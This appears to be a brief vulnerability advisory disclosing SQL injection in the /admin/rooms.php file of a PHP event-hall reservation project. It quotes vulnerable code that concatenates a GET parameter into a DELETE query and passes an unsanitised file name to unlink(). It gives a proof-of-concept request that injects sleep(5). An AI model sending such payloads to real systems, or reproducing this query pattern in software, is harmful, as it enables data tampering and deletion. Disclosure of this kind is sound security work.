# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - SQL Injection rooms.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/
> 
## Affected Component
> /admin/rooms.php

## Code
```php
if (isset($_GET['room_id'])) {
    $rid = $_GET['room_id'];
    $sql = "DELETE FROM tbl_rooms WHERE room_id = $rid";
    $result = $conn->query($sql);
    $img_name = $_GET['img_name'];
    $path = "../images/" . $img_name;
    $remove = unlink($path);
}
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/rooms.php?room_id=sleep(5) HTTP/1.1
Host: [REDACTED]
```

## Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/1552ce7d-bb51-473f-85e2-9f2763b331e8)

